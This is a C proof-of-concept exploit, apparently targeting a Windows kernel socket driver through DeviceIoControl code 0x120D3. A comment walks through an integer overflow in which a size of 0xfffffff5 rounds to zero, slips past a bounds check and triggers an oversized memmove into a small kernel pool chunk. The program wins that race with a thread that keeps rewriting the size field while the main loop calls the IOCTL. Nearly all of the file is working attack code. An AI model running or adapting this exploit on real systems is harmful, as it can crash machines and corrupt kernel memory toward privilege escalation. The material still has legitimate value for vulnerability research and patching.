#include <winsock2.h>
#include <ws2tcpip.h>
#include <mswsock.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int *userBuf = NULL;
int userBufSize = 24;

/*
 * chunkSize = 0xfffffff5
 * newChunkSize = 0xfffffff9
 * alignedNewChunkSize = (newChunkSize + 7) & 0xFFFFFFF8 -> (0x100000000) & 0xFFFFFFF8 = 0
 * So, we can bypass condition below
    ```  
    if ( remainedBytes < alignedNewChunkSize )
        return 0LL;
    ```
 * Then, copy 0xffffffe9 bytes to kernel pool (size 0x20)
    ```
    memmove(PoolWithQuotaTag + 16, userBuf->buf, chunkSize - 12);
    ```
*/

void *Thread(void *arg) {
    while (1) {
        userBuf[0] = 0x100000000-7-4;
    }
}

int main() {
    SOCKET s;
    SOCKADDR_IN sa;
    WSADATA wsaData;
    DWORD bytesReturned;
    int inBuf[100] = {0, };

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        printf("WSAStartup() failed.\n");
        return 1;
    }

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == INVALID_SOCKET) {
        printf("socket() failed.\n");
        WSACleanup();
        return 1;
    }

    memset(&sa, 0, sizeof(sa));
	sa.sin_port = htons(31337);
	sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	sa.sin_family = AF_INET;
	bind(s, (SOCKADDR*)&sa, sizeof(sa));


    userBuf = (int*)VirtualAlloc(NULL, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!userBuf) {
        printf("VirtualAlloc() failed");
        return 1;
    }

    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Thread, NULL, 0, 0);

    while (1) {
        inBuf[0] = 8;
        inBuf[1] = 8;
        inBuf[2] = 8;
        inBuf[6] = (int)userBuf;
        inBuf[7] = userBufSize;
    
        userBuf[0] = 12 + 12;       // size (header + body)
        userBuf[1] = 0xdeadbeef;
        userBuf[2] = 0xcafebabe;
        memset(userBuf + 12, 0, 12);
    
        DeviceIoControl((HANDLE)s, 0x120D3, inBuf, sizeof(inBuf), NULL, 0, &bytesReturned, 0);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}